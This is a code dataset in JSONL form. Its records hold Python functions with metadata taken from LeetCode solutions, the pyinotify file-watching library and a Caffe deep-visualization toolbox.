{"docstring": "\"\"\"\n:type nums: List[int]\n:rtype: int\n\"\"\"\n\n", "func_signal": "def findMaximumXOR(self, nums):\n", "code": "def dfs(root, num, mask):\n  if not root:\n    return\n  if mask == 0x00:\n    self.ans = max(self.ans, root.word ^ num)\n    return\n  if mask & num:\n    if root.zero:\n      dfs(root.zero, num, mask >> 1)\n    else:\n      dfs(root.one, num, mask >> 1)\n  else:\n    if root.one:\n      dfs(root.one, num, mask >> 1)\n    else:\n      dfs(root.zero, num, mask >> 1)\n\nif len(nums) < 2:\n  return 0\nroot = TrieNode()\nself.ans = float(\"-inf\")\nfor num in nums:\n  mask = 0x80000000\n  p = root\n  for i in range(0, 32):\n    node = None\n    if num & mask:\n      if not p.one:\n        node = TrieNode()\n        p.one = node\n      else:\n        node = p.one\n    else:\n      if not p.zero:\n        node = TrieNode()\n        p.zero = node\n      else:\n        node = p.zero\n    p = node\n    mask = mask >> 1\n  p.isWord = True\n  p.word = num\nfor num in nums:\n  dfs(root, num, 0x80000000)\nreturn self.ans", "path": "lc-all-solutions/421.maximum-xor-of-two-numbers-in-an-array/maximum-xor-of-two-numbers-in-an-array.py", "commit_date": "2018-12-10 00:00:00", "repo_name": "csujedihy/lc-all-solutions", "stars": 2144, "license": "None", "language": "python", "size": 813}
{"docstring": "\"\"\"\n:type rooms: List[List[int]]\n:rtype: void Do not return anything, modify rooms in-place instead.\n\"\"\"\n", "func_signal": "def wallsAndGates(self, rooms):\n", "code": "queue = deque([])\ndirections = [(1, 0), (-1, 0), (0, 1), (0, -1)]\nfor i in range(0, len(rooms)):\n  for j in range(0, len(rooms[0])):\n    if rooms[i][j] == 0:\n      queue.append((i, j))\n\nwhile queue:\n  i, j = queue.popleft()\n  for di, dj in directions:\n    p, q = i + di, j + dj\n    if 0 <= p < len(rooms) and 0 <= q < len(rooms[0]) and rooms[p][q] == INF:\n      rooms[p][q] = rooms[i][j] + 1\n      queue.append((p, q))", "path": "lc-all-solutions/286.walls-and-gates/walls-and-gates.py", "commit_date": "2018-12-10 00:00:00", "repo_name": "csujedihy/lc-all-solutions", "stars": 2144, "license": "None", "language": "python", "size": 813}
{"docstring": "\"\"\"\nClose inotify's instance (close its file descriptor).\nIt destroys all existing watches, pending events,...\nThis method is automatically called at the end of loop().\nAfterward it is invalid to access this instance.\n\"\"\"\n", "func_signal": "def stop(self):\n", "code": "if self._fd is not None:\n    self._pollobj.unregister(self._fd)\n    os.close(self._fd)\n    self._fd = None\nself._sys_proc_fun = None", "path": "pyinotify/python2/pyinotify.py", "commit_date": "2015-06-04 00:00:00", "repo_name": "seb-m/pyinotify", "stars": 2273, "license": "mit", "language": "python", "size": 4344}
{"docstring": "# Only consider sleeping if read_freq is > 0\n", "func_signal": "def _sleep(self, ref_time):\n", "code": "if self._read_freq > 0:\n    cur_time = time.time()\n    sleep_amount = self._read_freq - (cur_time - ref_time)\n    if sleep_amount > 0:\n        log.debug('Now sleeping %d seconds', sleep_amount)\n        time.sleep(sleep_amount)", "path": "pyinotify/python2/pyinotify.py", "commit_date": "2015-06-04 00:00:00", "repo_name": "seb-m/pyinotify", "stars": 2273, "license": "mit", "language": "python", "size": 4344}
{"docstring": "\"\"\"\nCommons handling for the followings events:\n\nIN_ACCESS, IN_MODIFY, IN_ATTRIB, IN_CLOSE_WRITE, IN_CLOSE_NOWRITE,\nIN_OPEN, IN_DELETE, IN_DELETE_SELF, IN_UNMOUNT.\n\"\"\"\n", "func_signal": "def process_default(self, raw_event, to_append=None):\n", "code": "watch_ = self._watch_manager.get_watch(raw_event.wd)\nif raw_event.mask & (IN_DELETE_SELF | IN_MOVE_SELF):\n    # Unfornulately this information is not provided by the kernel\n    dir_ = watch_.dir\nelse:\n    dir_ = bool(raw_event.mask & IN_ISDIR)\ndict_ = {'wd': raw_event.wd,\n         'mask': raw_event.mask,\n         'path': watch_.path,\n         'name': raw_event.name,\n         'dir': dir_}\nif COMPATIBILITY_MODE:\n    dict_['is_dir'] = dir_\nif to_append is not None:\n    dict_.update(to_append)\nreturn Event(dict_)", "path": "pyinotify/python2/pyinotify.py", "commit_date": "2015-06-04 00:00:00", "repo_name": "seb-m/pyinotify", "stars": 2273, "license": "mit", "language": "python", "size": 4344}
{"docstring": "\"\"\"\nSee comment in AsyncNotifier.\n\n\"\"\"\n", "func_signal": "def handle_read(self, *args, **kwargs):\n", "code": "self.read_events()\nself.process_events()\nif self.handle_read_callback is not None:\n    self.handle_read_callback(self)", "path": "pyinotify/python2/pyinotify.py", "commit_date": "2015-06-04 00:00:00", "repo_name": "seb-m/pyinotify", "stars": 2273, "license": "mit", "language": "python", "size": 4344}
{"docstring": "\"\"\"\nWhen asyncore tells us we can read from the fd, we proceed processing\nevents. This method can be overridden for handling a notification\ndifferently.\n\n\"\"\"\n", "func_signal": "def handle_read(self):\n", "code": "self.read_events()\nself.process_events()", "path": "pyinotify/python2/pyinotify.py", "commit_date": "2015-06-04 00:00:00", "repo_name": "seb-m/pyinotify", "stars": 2273, "license": "mit", "language": "python", "size": 4344}
{"docstring": "\"\"\"\nReturns the watch descriptor associated to path. This method\npresents a prohibitive cost, always prefer to keep the WD\nreturned by add_watch(). If the path is unknown it returns None.\n\n@param path: Path.\n@type path: str\n@return: WD or None.\n@rtype: int or None\n\"\"\"\n", "func_signal": "def get_wd(self, path):\n", "code": "path = self.__format_path(path)\nfor iwd in self._wmd.items():\n    if iwd[1].path == path:\n        return iwd[0]", "path": "pyinotify/python2/pyinotify.py", "commit_date": "2015-06-04 00:00:00", "repo_name": "seb-m/pyinotify", "stars": 2273, "license": "mit", "language": "python", "size": 4344}
{"docstring": "\"\"\"\nExamples:\n  ef1 = ExcludeFilter([\"/etc/rc.*\", \"/etc/hostname\"])\n  ef2 = ExcludeFilter(\"/my/path/exclude.lst\")\n  Where exclude.lst contains:\n  /etc/rc.*\n  /etc/hostname\n\nNote: it is not possible to exclude a file if its encapsulating\n      directory is itself watched. See this issue for more details\n      https://github.com/seb-m/pyinotify/issues/31\n\n@param arg_lst: is either a list of patterns or a filename from which\n                patterns will be loaded.\n@type arg_lst: list of str or str\n\"\"\"\n", "func_signal": "def __init__(self, arg_lst):\n", "code": "if isinstance(arg_lst, str):\n    lst = self._load_patterns_from_file(arg_lst)\nelif isinstance(arg_lst, list):\n    lst = arg_lst\nelse:\n    raise TypeError\n\nself._lregex = []\nfor regex in lst:\n    self._lregex.append(re.compile(regex, re.UNICODE))", "path": "pyinotify/python2/pyinotify.py", "commit_date": "2015-06-04 00:00:00", "repo_name": "seb-m/pyinotify", "stars": 2273, "license": "mit", "language": "python", "size": 4344}
{"docstring": "# Unicode strings must be encoded to string prior to calling this\n# method.\n", "func_signal": "def inotify_add_watch(self, fd, pathname, mask):\n", "code": "assert isinstance(pathname, str)\nreturn self._inotify_add_watch(fd, pathname, mask)", "path": "pyinotify/python2/pyinotify.py", "commit_date": "2015-06-04 00:00:00", "repo_name": "seb-m/pyinotify", "stars": 2273, "license": "mit", "language": "python", "size": 4344}
{"docstring": "\"\"\"\nMap the source path with the destination path (+ date for\ncleaning).\n\"\"\"\n", "func_signal": "def process_IN_MOVED_TO(self, raw_event):\n", "code": "watch_ = self._watch_manager.get_watch(raw_event.wd)\npath_ = watch_.path\ndst_path = os.path.normpath(os.path.join(path_, raw_event.name))\nmv_ = self._mv_cookie.get(raw_event.cookie)\nto_append = {'cookie': raw_event.cookie}\nif mv_ is not None:\n    self._mv[mv_[0]] = (dst_path, datetime.now())\n    # Let's assume that IN_MOVED_FROM event is always queued before\n    # that its associated (they share a common cookie) IN_MOVED_TO\n    # event is queued itself. It is then possible in that scenario\n    # to provide as additional information to the IN_MOVED_TO event\n    # the original pathname of the moved file/directory.\n    to_append['src_pathname'] = mv_[0]\nelif (raw_event.mask & IN_ISDIR and watch_.auto_add and\n      not watch_.exclude_filter(dst_path)):\n    # We got a diretory that's \"moved in\" from an unknown source and\n    # auto_add is enabled. Manually add watches to the inner subtrees.\n    # The newly monitored directory inherits attributes from its\n    # parent directory.\n    self._watch_manager.add_watch(dst_path, watch_.mask,\n                                  proc_fun=watch_.proc_fun,\n                                  rec=True, auto_add=True,\n                                  exclude_filter=watch_.exclude_filter)\nreturn self.process_default(raw_event, to_append)", "path": "pyinotify/python2/pyinotify.py", "commit_date": "2015-06-04 00:00:00", "repo_name": "seb-m/pyinotify", "stars": 2273, "license": "mit", "language": "python", "size": 4344}
{"docstring": "\"\"\"\n@return: Generic event string representation.\n@rtype: str\n\"\"\"\n", "func_signal": "def __repr__(self):\n", "code": "s = ''\nfor attr, value in sorted(self.__dict__.items(), key=lambda x: x[0]):\n    if attr.startswith('_'):\n        continue\n    if attr == 'mask':\n        value = hex(getattr(self, attr))\n    elif isinstance(value, basestring) and not value:\n        value = \"''\"\n    s += ' %s%s%s' % (output_format.field_name(attr),\n                      output_format.punctuation('='),\n                      output_format.field_value(value))\n\ns = '%s%s%s %s' % (output_format.punctuation('<'),\n                   output_format.class_name(self.__class__.__name__),\n                   s,\n                   output_format.punctuation('>'))\nreturn s", "path": "pyinotify/python2/pyinotify.py", "commit_date": "2015-06-04 00:00:00", "repo_name": "seb-m/pyinotify", "stars": 2273, "license": "mit", "language": "python", "size": 4344}
{"docstring": "\"\"\"\nWatch a transient file, which will be created and deleted frequently\nover time (e.g. pid file).\n\n@attention: Currently under the call to this function it is not\npossible to correctly watch the events triggered into the same\nbase directory than the directory where is located this watched\ntransient file. For instance it would be wrong to make these\ntwo successive calls: wm.watch_transient_file('/var/run/foo.pid', ...)\nand wm.add_watch('/var/run/', ...)\n\n@param filename: Filename.\n@type filename: string\n@param mask: Bitmask of events, should contain IN_CREATE and IN_DELETE.\n@type mask: int\n@param proc_class: ProcessEvent (or of one of its subclass), beware of\n                   accepting a ProcessEvent's instance as argument into\n                   __init__, see transient_file.py example for more\n                   details.\n@type proc_class: ProcessEvent's instance or of one of its subclasses.\n@return: Same as add_watch().\n@rtype: Same as add_watch().\n\"\"\"\n", "func_signal": "def watch_transient_file(self, filename, mask, proc_class):\n", "code": "dirname = os.path.dirname(filename)\nif dirname == '':\n    return {}  # Maintains coherence with add_watch()\nbasename = os.path.basename(filename)\n# Assuming we are watching at least for IN_CREATE and IN_DELETE\nmask |= IN_CREATE | IN_DELETE\n\ndef cmp_name(event):\n    if getattr(event, 'name') is None:\n        return False\n    return basename == event.name\nreturn self.add_watch(dirname, mask,\n                      proc_fun=proc_class(ChainIfTrue(func=cmp_name)),\n                      rec=False,\n                      auto_add=False, do_glob=False,\n                      exclude_filter=lambda path: False)", "path": "pyinotify/python2/pyinotify.py", "commit_date": "2015-06-04 00:00:00", "repo_name": "seb-m/pyinotify", "stars": 2273, "license": "mit", "language": "python", "size": 4344}
{"docstring": "\"\"\"\n@param msg: Exception string's description.\n@type msg: string\n@param wmd: This dictionary contains the wd assigned to paths of the\n            same call for which watches were successfully added.\n@type wmd: dict\n\"\"\"\n", "func_signal": "def __init__(self, msg, wmd):\n", "code": "self.wmd = wmd\nException.__init__(self, msg)", "path": "pyinotify/python2/pyinotify.py", "commit_date": "2015-06-04 00:00:00", "repo_name": "seb-m/pyinotify", "stars": 2273, "license": "mit", "language": "python", "size": 4344}
{"docstring": "\"\"\"\n\n@param wm: Watch Manager.\n@type wm: WatchManager instance\n@param notifier: Notifier.\n@type notifier: Notifier instance\n\"\"\"\n", "func_signal": "def __init__(self, wm, notifier):\n", "code": "self._watch_manager = wm  # watch manager\nself._notifier = notifier  # notifier\nself._mv_cookie = {}  # {cookie(int): (src_path(str), date), ...}\nself._mv = {}  # {src_path(str): (dst_path(str), date), ...}", "path": "pyinotify/python2/pyinotify.py", "commit_date": "2015-06-04 00:00:00", "repo_name": "seb-m/pyinotify", "stars": 2273, "license": "mit", "language": "python", "size": 4344}
{"docstring": "\"\"\"\nRemoves watch(s).\n\n@param wd: Watch Descriptor of the file or directory to unwatch.\n           Also accepts a list of WDs.\n@type wd: int or list of int.\n@param rec: Recursively removes watches on every already watched\n            subdirectories and subfiles.\n@type rec: bool\n@param quiet: If False raises a WatchManagerError exception on\n              error. See example not_quiet.py\n@type quiet: bool\n@return: dict of watch descriptors associated to booleans values.\n         True if the corresponding wd has been successfully\n         removed, False otherwise.\n@rtype: dict of {int: bool}\n\"\"\"\n", "func_signal": "def rm_watch(self, wd, rec=False, quiet=True):\n", "code": "lwd = self.__format_param(wd)\nif rec:\n    lwd = self.__get_sub_rec(lwd)\n\nret_ = {}  # return {wd: bool, ...}\nfor awd in lwd:\n    # remove watch\n    wd_ = self._inotify_wrapper.inotify_rm_watch(self._fd, awd)\n    if wd_ < 0:\n        ret_[awd] = False\n        err = ('rm_watch: cannot remove WD=%d, %s' % \\\n                   (awd, self._inotify_wrapper.str_errno()))\n        if quiet:\n            log.error(err)\n            continue\n        raise WatchManagerError(err, ret_)\n\n    # Remove watch from our dictionary\n    if awd in self._wmd:\n        del self._wmd[awd]\n    ret_[awd] = True\n    log.debug('Watch WD=%d (%s) removed', awd, self.get_path(awd))\nreturn ret_", "path": "pyinotify/python2/pyinotify.py", "commit_date": "2015-06-04 00:00:00", "repo_name": "seb-m/pyinotify", "stars": 2273, "license": "mit", "language": "python", "size": 4344}
{"docstring": "\"\"\"\nRoutine for processing events from queue by calling their\nassociated proccessing method (an instance of ProcessEvent).\nIt also does internal processings, to keep the system updated.\n\"\"\"\n", "func_signal": "def process_events(self):\n", "code": "while self._eventq:\n    raw_event = self._eventq.popleft()  # pop next event\n    if self._watch_manager.ignore_events:\n        log.debug(\"Event ignored: %s\" % repr(raw_event))\n        continue\n    watch_ = self._watch_manager.get_watch(raw_event.wd)\n    if (watch_ is None) and not (raw_event.mask & IN_Q_OVERFLOW):\n        if not (raw_event.mask & IN_IGNORED):\n            # Not really sure how we ended up here, nor how we should\n            # handle these types of events and if it is appropriate to\n            # completly skip them (like we are doing here).\n            log.warning(\"Unable to retrieve Watch object associated to %s\",\n                        repr(raw_event))\n        continue\n    revent = self._sys_proc_fun(raw_event)  # system processings\n    if watch_ and watch_.proc_fun:\n        watch_.proc_fun(revent)  # user processings\n    else:\n        self._default_proc_fun(revent)\nself._sys_proc_fun.cleanup()  # remove olds MOVED_* events records\nif self._coalesce:\n    self._eventset.clear()", "path": "pyinotify/python2/pyinotify.py", "commit_date": "2015-06-04 00:00:00", "repo_name": "seb-m/pyinotify", "stars": 2273, "license": "mit", "language": "python", "size": 4344}
{"docstring": "\"\"\"\nWrites event string representation to file object provided to\nmy_init().\n\n@param event: Event to be processed. Can be of any type of events but\n              IN_Q_OVERFLOW events (see method process_IN_Q_OVERFLOW).\n@type event: Event instance\n\"\"\"\n", "func_signal": "def process_default(self, event):\n", "code": "self._out.write(str(event))\nself._out.write('\\n')\nself._out.flush()", "path": "pyinotify/python2/pyinotify.py", "commit_date": "2015-06-04 00:00:00", "repo_name": "seb-m/pyinotify", "stars": 2273, "license": "mit", "language": "python", "size": 4344}
{"docstring": "\"\"\"\nGet every wd from self._wmd if its path is under the path of\none (at least) of those in lpath. Doesn't follow symlinks.\n\n@param lpath: list of watch descriptor\n@type lpath: list of int\n@return: list of watch descriptor\n@rtype: list of int\n\"\"\"\n", "func_signal": "def __get_sub_rec(self, lpath):\n", "code": "for d in lpath:\n    root = self.get_path(d)\n    if root is not None:\n        # always keep root\n        yield d\n    else:\n        # if invalid\n        continue\n\n    # nothing else to expect\n    if not os.path.isdir(root):\n        continue\n\n    # normalization\n    root = os.path.normpath(root)\n    # recursion\n    lend = len(root)\n    for iwd in self._wmd.items():\n        cur = iwd[1].path\n        pref = os.path.commonprefix([root, cur])\n        if root == os.sep or (len(pref) == lend and \\\n                              len(cur) > lend and \\\n                              cur[lend] == os.sep):\n            yield iwd[1].wd", "path": "pyinotify/python2/pyinotify.py", "commit_date": "2015-06-04 00:00:00", "repo_name": "seb-m/pyinotify", "stars": 2273, "license": "mit", "language": "python", "size": 4344}
{"docstring": "\"\"\"\nReturns the path associated to WD, if WD is unknown it returns None.\n\n@param wd: Watch descriptor.\n@type wd: int\n@return: Path or None.\n@rtype: string or None\n\"\"\"\n", "func_signal": "def get_path(self, wd):\n", "code": "watch_ = self._wmd.get(wd)\nif watch_ is not None:\n    return watch_.path", "path": "pyinotify/python2/pyinotify.py", "commit_date": "2015-06-04 00:00:00", "repo_name": "seb-m/pyinotify", "stars": 2273, "license": "mit", "language": "python", "size": 4344}
{"docstring": "\"\"\"\nThe watch descriptor raised by this event is now ignored (forever),\nit can be safely deleted from the watch manager dictionary.\nAfter this event we can be sure that neither the event queue nor\nthe system will raise an event associated to this wd again.\n\"\"\"\n", "func_signal": "def process_IN_IGNORED(self, raw_event):\n", "code": "event_ = self.process_default(raw_event)\nself._watch_manager.del_watch(raw_event.wd)\nreturn event_", "path": "pyinotify/python2/pyinotify.py", "commit_date": "2015-06-04 00:00:00", "repo_name": "seb-m/pyinotify", "stars": 2273, "license": "mit", "language": "python", "size": 4344}
{"docstring": "\"\"\"\nThread's main loop. Don't meant to be called by user directly.\nCall inherited start() method instead.\n\nEvents are read only once time every min(read_freq, timeout)\nseconds at best and only if the size of events to read is >= threshold.\n\"\"\"\n# When the loop must be terminated .stop() is called, 'stop'\n# is written to pipe fd so poll() returns and .check_events()\n# returns False which make evaluate the While's stop condition\n# ._stop_event.isSet() wich put an end to the thread's execution.\n", "func_signal": "def loop(self):\n", "code": "while not self._stop_event.isSet():\n    self.process_events()\n    ref_time = time.time()\n    if self.check_events():\n        self._sleep(ref_time)\n        self.read_events()", "path": "pyinotify/python2/pyinotify.py", "commit_date": "2015-06-04 00:00:00", "repo_name": "seb-m/pyinotify", "stars": 2273, "license": "mit", "language": "python", "size": 4344}
{"docstring": "# From https://stackoverflow.com/questions/600268/mkdir-p-functionality-in-python\n", "func_signal": "def mkdir_p(path):\n", "code": "try:\n    os.makedirs(path)\nexcept OSError as exc: # Python >2.5\n    if exc.errno == errno.EEXIST and os.path.isdir(path):\n        pass\n    else:\n        raise", "path": "deep-visualization-toolbox/find_maxes/max_tracker.py", "commit_date": "2016-03-17 00:00:00", "repo_name": "yosinski/deep-visualization-toolbox", "stars": 3977, "license": "mit", "language": "python", "size": 1560}
{"docstring": "'''Convert vals in [0,1] to [0,255]'''\n", "func_signal": "def to_255(vals_01):\n", "code": "try:\n    ret = [v*255 for v in vals_01]\n    if type(vals_01) is tuple:\n        return tuple(ret)\n    else:\n        return ret\nexcept TypeError:\n    # Not iterable (single int or float)\n    return vals_01*255", "path": "deep-visualization-toolbox/image_misc.py", "commit_date": "2016-02-26 00:00:00", "repo_name": "yosinski/deep-visualization-toolbox", "stars": 3977, "license": "mit", "language": "python", "size": 1560}
{"docstring": "# returns list of pair files in requested siamese image list file\n\n", "func_signal": "def get_files_from_siamese_image_list(self):\n", "code": "available_files = []\n\nwith open(self.settings.static_files_input_file, 'r') as image_list_file:\n    lines = image_list_file.readlines()\n    # take first and second tokens from each line\n    available_files = [(tsplit(line, True, ' ', ',','\\t')[0], tsplit(line, True, ' ', ',','\\t')[1])\n                       for line in lines if line.strip() != \"\"]\n\nreturn available_files", "path": "deep-visualization-toolbox/input_fetcher.py", "commit_date": "2017-09-08 00:00:00", "repo_name": "yosinski/deep-visualization-toolbox", "stars": 3977, "license": "mit", "language": "python", "size": 1560}
{"docstring": "'''Destructively drop arrays and replace with strings\ncontaining first couple values; useful for saving results as a\nreasonably sized pickle file.\n'''\n", "func_signal": "def trim_arrays(self):\n", "code": "for key,val in self.__dict__.iteritems():\n    if isinstance(val, ndarray):\n        valstr = '%s array [%s, %s, ...]' % (val.shape, val.flatten()[0], val.flatten()[1])\n        self.__dict__[key] = 'Trimmed %s' % valstr", "path": "deep-visualization-toolbox/optimize/gradient_optimizer.py", "commit_date": "2016-02-22 00:00:00", "repo_name": "yosinski/deep-visualization-toolbox", "stars": 3977, "license": "mit", "language": "python", "size": 1560}
{"docstring": "'''Get a height x width size that will fit n_tiles tiles.'''\n", "func_signal": "def get_tiles_height_width_ratio(n_tiles, width_ratio = 1.0):\n", "code": "width = int(np.ceil(np.sqrt(n_tiles * width_ratio)))\nreturn get_tiles_height_width(n_tiles, desired_width = width)", "path": "deep-visualization-toolbox/image_misc.py", "commit_date": "2016-02-26 00:00:00", "repo_name": "yosinski/deep-visualization-toolbox", "stars": 3977, "license": "mit", "language": "python", "size": 1560}
{"docstring": "'''Get the approximate frames per second processed by this\nthread, considering only the last image processed. If more\nthan two seconds ago, assume pipeline has stalled elsewhere\n(perhaps using static images that are only processed once).\n'''\n", "func_signal": "def approx_fps(self):\n", "code": "if self.last_process_elapsed and (time.time() - self.last_process_finished_at) < 2.0:\n    return 1.0 / (self.last_process_elapsed + 1e-6)\nelse:\n    return 0.0", "path": "deep-visualization-toolbox/caffevis/caffe_proc_thread.py", "commit_date": "2017-09-08 00:00:00", "repo_name": "yosinski/deep-visualization-toolbox", "stars": 3977, "license": "mit", "language": "python", "size": 1560}
{"docstring": "'''Fetch the latest frame_idx and frame. The idx increments\nany time the frame data changes. If the idx is < 0, the frame\nis not valid.\n'''\n", "func_signal": "def get_frame(self):\n", "code": "with self.lock:\n    return (self.latest_frame_idx, self.latest_frame_data)", "path": "deep-visualization-toolbox/input_fetcher.py", "commit_date": "2017-09-08 00:00:00", "repo_name": "yosinski/deep-visualization-toolbox", "stars": 3977, "license": "mit", "language": "python", "size": 1560}
{"docstring": "# returns list of files in requested image list file\n\n", "func_signal": "def get_files_from_image_list(self):\n", "code": "available_files = []\n\nwith open(self.settings.static_files_input_file, 'r') as image_list_file:\n    lines = image_list_file.readlines()\n    # take first token from each line\n    available_files = [tsplit(line, True,' ',',','\\t')[0] for line in lines if line.strip() != \"\"]\n\nreturn available_files", "path": "deep-visualization-toolbox/input_fetcher.py", "commit_date": "2017-09-08 00:00:00", "repo_name": "yosinski/deep-visualization-toolbox", "stars": 3977, "license": "mit", "language": "python", "size": 1560}
{"docstring": "'''If data is uint, convert to float and divide by 255. Else leave at float.'''\n", "func_signal": "def ensure_float01(arr, dtype_preference = 'float32'):\n", "code": "if arr.dtype == 'uint8':\n    #print 'extra check...'\n    #assert arr.max() <= 256\n    return np.array(arr, dtype = dtype_preference) / 255\nelif arr.dtype in ('float32', 'float64'):\n    return arr\nelse:\n    raise Exception('ensure_float01 expects uint8 or float input but got %s with range [%g,%g,].' % (arr.dtype, arr.min(), arr.max()))", "path": "deep-visualization-toolbox/image_misc.py", "commit_date": "2016-02-26 00:00:00", "repo_name": "yosinski/deep-visualization-toolbox", "stars": 3977, "license": "mit", "language": "python", "size": 1560}
{"docstring": "'''Load a 2D (3D with color channels) sprite image where\n(rows,cols) = rows_cols, slices, and returns as a 3D tensor (4D\nwith color channels). Sprite shape is computed automatically. If\nn_sprites is not given, it is assumed to be rows*cols. Return as\n3D tensor with shape (n_sprites, sprite_height, sprite_width,\nsprite_channels).\n'''\n\n", "func_signal": "def load_sprite_image(img_path, rows_cols, n_sprites = None):\n", "code": "rows,cols = rows_cols\nif n_sprites is None:\n    n_sprites = rows * cols\nimg = caffe_load_image(img_path, color = True, as_uint = True)\nassert img.shape[0] % rows == 0, 'sprite image has shape %s which is not divisible by rows_cols %' % (img.shape, rows_cols)\nassert img.shape[1] % cols == 0, 'sprite image has shape %s which is not divisible by rows_cols %' % (img.shape, rows_cols)\nsprite_height = img.shape[0] / rows\nsprite_width  = img.shape[1] / cols\nsprite_channels = img.shape[2]\n\nret = np.zeros((n_sprites, sprite_height, sprite_width, sprite_channels), dtype = img.dtype)\nfor idx in xrange(n_sprites):\n    # Row-major order\n    ii = idx / cols\n    jj = idx % cols\n    ret[idx] = img[ii*sprite_height:(ii+1)*sprite_height,\n                   jj*sprite_width:(jj+1)*sprite_width, :]\nreturn ret", "path": "deep-visualization-toolbox/caffevis/caffevis_helper.py", "commit_date": "2017-09-08 00:00:00", "repo_name": "yosinski/deep-visualization-toolbox", "stars": 3977, "license": "mit", "language": "python", "size": 1560}
{"docstring": "'''Whether to show back diff information or stale or disabled indicator'''\n", "func_signal": "def get_back_what_to_disp(self):\n", "code": "if (self.state.cursor_area == 'top' and not self.state.backprop_selection_frozen) or not self.state.back_enabled:\n    return 'disabled'\nelif self.state.back_stale:\n    return 'stale'\nelse:\n    return 'normal'", "path": "deep-visualization-toolbox/caffevis/app.py", "commit_date": "2017-09-08 00:00:00", "repo_name": "yosinski/deep-visualization-toolbox", "stars": 3977, "license": "mit", "language": "python", "size": 1560}
{"docstring": "'''Chooses a starting location'''\n\n", "func_signal": "def _get_x0(self, params):\n", "code": "np.random.seed(params.rand_seed)\n\nif params.start_at == 'mean_plus_rand':\n    x0 = np.random.normal(0, 10, self.data_mean.shape)\nelif params.start_at == 'randu':\n    x0 = uniform(0, 255, self.data_mean.shape) - self.data_mean\nelif params.start_at == 'mean':\n    x0 = zeros(self.data_mean.shape)\nelse:\n    raise Exception('Unknown start conditions: %s' % params.start_at)\n\nreturn x0", "path": "deep-visualization-toolbox/optimize/gradient_optimizer.py", "commit_date": "2016-02-22 00:00:00", "repo_name": "yosinski/deep-visualization-toolbox", "stars": 3977, "license": "mit", "language": "python", "size": 1560}
{"docstring": "'''Given an large image consisting of 3x3 squares with small_padding padding concatenated into a 2x2 grid with large_padding padding, return one of the four corners (0, 1, 2, 3)'''\n", "func_signal": "def crop_to_corner(img, corner, small_padding = 1, large_padding = 2):\n", "code": "assert corner in (0,1,2,3), 'specify corner 0, 1, 2, or 3'\nassert img.shape[0] == img.shape[1], 'img is not square'\nassert img.shape[0] % 2 == 0, 'even number of pixels assumption violated'\nhalf_size = img.shape[0]/2\nbig_ii = 0 if corner in (0,1) else 1\nbig_jj = 0 if corner in (0,2) else 1\ntp = small_padding + large_padding\n#tp = 0\nreturn img[big_ii*half_size+tp:(big_ii+1)*half_size-tp,\n           big_jj*half_size+tp:(big_jj+1)*half_size-tp]", "path": "deep-visualization-toolbox/caffevis/caffevis_helper.py", "commit_date": "2017-09-08 00:00:00", "repo_name": "yosinski/deep-visualization-toolbox", "stars": 3977, "license": "mit", "language": "python", "size": 1560}
{"docstring": "'''Maps the input range to [0,1] such that the center value maps to .5'''\n", "func_signal": "def norm01c(arr, center):\n", "code": "arr = arr.copy()\narr -= center\narr /= max(2 * arr.max(), -2 * arr.min()) + 1e-10\narr += .5\nassert arr.min() >= 0\nassert arr.max() <= 1\nreturn arr", "path": "deep-visualization-toolbox/image_misc.py", "commit_date": "2016-02-26 00:00:00", "repo_name": "yosinski/deep-visualization-toolbox", "stars": 3977, "license": "mit", "language": "python", "size": 1560}
{"docstring": "'''Gets the maximum size of the data layer that can influence a unit on layer.'''\n", "func_signal": "def get_max_data_extent(net, layer, rc, is_conv):\n", "code": "if is_conv:\n    conv_size = net.blobs[layer].data.shape[2:4]        # e.g. (13,13) for conv5\n    layer_slice_middle = (conv_size[0]/2,conv_size[0]/2+1, conv_size[1]/2,conv_size[1]/2+1)   # e.g. (6,7,6,7,), the single center unit\n    data_slice = rc.convert_region(layer, 'data', layer_slice_middle)\n    return data_slice[1]-data_slice[0], data_slice[3]-data_slice[2]   # e.g. (163, 163) for conv5\nelse:\n    # Whole data region\n    return net.blobs['data'].data.shape[2:4]        # e.g. (227,227) for fc6,fc7,fc8,prop", "path": "deep-visualization-toolbox/find_maxes/max_tracker.py", "commit_date": "2016-03-17 00:00:00", "repo_name": "yosinski/deep-visualization-toolbox", "stars": 3977, "license": "mit", "language": "python", "size": 1560}
{"docstring": "# Shorten many layer names to fit in control pane (full layer name visible in status bar)\n", "func_signal": "def caffevis_layer_pretty_name_fn(name):\n", "code": "name = name.replace('conv','c').replace('pool','p').replace('norm','n')\nname = name.replace('inception_','i').replace('output','o').replace('reduce','r').replace('split_','s')\nname = name.replace('__','_').replace('__','_')\nreturn name", "path": "deep-visualization-toolbox/models/bvlc-googlenet/settings_local.template-bvlc-googlenet.py", "commit_date": "2016-02-27 00:00:00", "repo_name": "yosinski/deep-visualization-toolbox", "stars": 3977, "license": "mit", "language": "python", "size": 1560}
{"docstring": "'''Updates the maxes found so far with the state of the given net. If a new max is found, it is stored together with the image_idx.'''\n", "func_signal": "def update(self, net, image_idx, image_class):\n", "code": "if not self.init_done:\n    self._init_with_net(net)\n\nfor layer in self.layers:\n    blob = net.blobs[layer].data\n    self.max_trackers[layer].update(blob, image_idx, image_class)", "path": "deep-visualization-toolbox/find_maxes/max_tracker.py", "commit_date": "2016-03-17 00:00:00", "repo_name": "yosinski/deep-visualization-toolbox", "stars": 3977, "license": "mit", "language": "python", "size": 1560}
{"docstring": "# returns list of files in requested directory\n\n", "func_signal": "def get_files_from_directory(self):\n", "code": "available_files = []\nmatch_flags = re.IGNORECASE if self.settings.static_files_ignore_case else 0\nfor filename in os.listdir(self.settings.static_files_dir):\n    if re.match(self.settings.static_files_regexp, filename, match_flags):\n        available_files.append(filename)\n\nreturn available_files", "path": "deep-visualization-toolbox/input_fetcher.py", "commit_date": "2017-09-08 00:00:00", "repo_name": "yosinski/deep-visualization-toolbox", "stars": 3977, "license": "mit", "language": "python", "size": 1560}
